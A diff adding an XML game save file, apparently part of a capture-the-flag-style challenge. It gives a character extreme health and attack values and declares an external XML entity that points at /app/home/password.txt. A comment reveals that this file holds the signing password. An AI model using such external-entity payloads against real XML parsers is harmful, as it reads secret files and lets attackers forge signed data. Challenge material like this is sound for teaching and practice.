@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE replace [<!ENTITY test SYSTEM '/app/home/password.txt'>]>
+<entityRPG>
+<account id="1001">
+<name>giga_chad</name>
+<health>100000000</health>
+<currHealth>100000000</currHealth>
+<attack>10000000</attack>
+<characterHash>/Mv9WlpFJ0QXsA1U18jLSYT+0sY1L+qK82J28LDM5e8=</characterHash>
+<!--Due to safety reasons the XML data is checked by decrypting text in format attack:health:currentHealth which is signed AES with password stored in /app/home/password.txt .-->
+</account>
+</entityRPG>
